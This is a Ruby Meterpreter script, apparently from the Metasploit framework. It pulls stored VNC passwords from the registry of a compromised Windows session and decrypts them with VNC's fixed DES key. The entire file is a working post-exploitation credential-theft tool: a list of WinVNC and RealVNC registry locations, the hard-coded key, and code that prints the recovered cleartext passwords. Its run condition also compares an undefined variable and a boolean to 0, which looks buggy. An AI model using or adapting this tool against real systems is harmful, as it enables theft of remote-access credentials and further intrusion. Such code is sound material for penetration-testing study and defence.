#!/usr/bin/env ruby

#----------------------------------------------------------------
# Meterpreter script to obtain the VNC password out of the
# registry and print its decoded cleartext
#
# by Kurt Grutzmacher <grutz@jingojango.net>
#
# rev history
# -----------
# 1.0 - 9/24/9 - Initial release
#----------------------------------------------------------------

require 'cipher/des'

session = client

@@exec_opts = Rex::Parser::Arguments.new(
	"-h" => [ false, "Help menu."],
	"-k" => [ true, "Specific registry key to search (minus Password)."],
	"-l" => [ false, "List default key locations"]
)

def usage()
	print("\nPull the VNC Password from a Windows Meterpreter session\n")
	print("By default an internal list of keys will be searched.\n\n")
	print("\t-k\tSpecific key to search (e.g. HKLM\\\\Software\\\\ORL\\\\WinVNC3\\\\Default)\n")
	print("\t-l\tList default key locations\n\n")
	completed
end

def get_vncpw(session, key)
	root_key, base_key = session.sys.registry.splitkey(key)
	open_key = session.sys.registry.open_key(root_key,base_key,KEY_READ)
	begin
		return open_key.query_value('Password')
	rescue
		# no registry key found or other error
		return nil
	end
end

# fixed des key
fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
# 5A B2 CD C0 BA DC AF 13
# some common places for VNC password hashes
keys = [
	'HKLM\\Software\\ORL\\WinVNC3', 'HKCU\\Software\\ORL\\WinVNC3',
	'HKLM\\Software\\ORL\\WinVNC3\\Default', 'HKCU\\Software\\ORL\\WinVNC3\\Default',
	'HKLM\\Software\\ORL\\WinVNC\\Default', 'HKCU\\Software\\ORL\\WinVNC\\Default',
	'HKLM\\Software\\RealVNC\\WinVNC4', 'HKCU\\Software\\RealVNC\\WinVNC4',
	'HKLM\\Software\\RealVNC\\Default', 'HKCU\\Software\\RealVNC\\Default',
       ]

# parse the command line
listkeylocs = false
keytosearch = nil

@@exec_opts.parse(args) { |opt, idx, val|
    case opt
	    when "-h"
			usage
		when "-l"
			listkeylocs = true
		when "-k"
			keytosearch = val
	end
}

if (args.length == 0 or keytosearch != nil) and (help == 0 and listkeylocs == 0)

	if keytosearch == nil
		print_status("Searching for VNC Passwords in the registry....")
		keys.each { |key|
			vncpw = get_vncpw(session, key)
			if vncpw
				vncpw_hextext = vncpw.data.unpack("H*").to_s
				vncpw_text = Cipher::DES.decrypt fixedkey, vncpw.data
				print_status("FOUND in #{key} -=> #{vncpw_hextext} => #{vncpw_text}")
			end
		}
	else
		print_status("Searching in regkey: #{keytosearch}")
		vncpw = get_vncpw(session, keytosearch)
		if vncpw
			vncpw_hextext = vncpw.data.unpack("H*").to_s
			vncpw_text = Cipher::DES.decrypt fixedkey, vncpw.data
			print_status("FOUND in #{keytosearch} -=> #{vncpw_hextext} => #{vncpw_text}")
		else
			print_status("Not found")
		end
	end
end

if listkeylocs
	print_line("\nVNC Registry Key Locations")
	print_line("--------------------------\n")
	keys.each { |key|
		print_line("\t#{key}")
	}
end

